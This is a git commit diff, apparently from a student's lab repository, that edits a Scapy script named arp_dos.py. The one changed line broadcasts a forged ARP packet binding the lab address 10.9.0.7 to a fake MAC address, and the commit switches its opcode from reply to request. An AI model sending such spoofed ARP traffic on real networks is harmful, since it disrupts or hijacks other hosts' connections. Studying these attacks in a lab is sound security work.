5f952190dc1f07329646a527c2cdbe5bb376f36c
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-10-31 12:05:08 -0400

    ugh

--- arp/arp_dos.py
+++ arp/arp_dos.py
@@ -13,7 +13,7 @@ def get_mac_address():
     return "02:00:00:%02x:%02x:%02x" % (randint(0, 255), randint(0, 255), randint(0, 255))
 
 def main():
-    sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src="de:ad:be:ef:ca:fe") / ARP(op=2, psrc="10.9.0.7", hwsrc="de:ad:be:ef:ca:fe", pdst="10.9.0.7", hwdst="de:ad:be:ef:ca:fe"))
+    sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src="de:ad:be:ef:ca:fe") / ARP(op=1, psrc="10.9.0.7", hwsrc="de:ad:be:ef:ca:fe", pdst="10.9.0.7", hwdst="de:ad:be:ef:ca:fe"))
 
 if __name__ == "__main__":
     main()
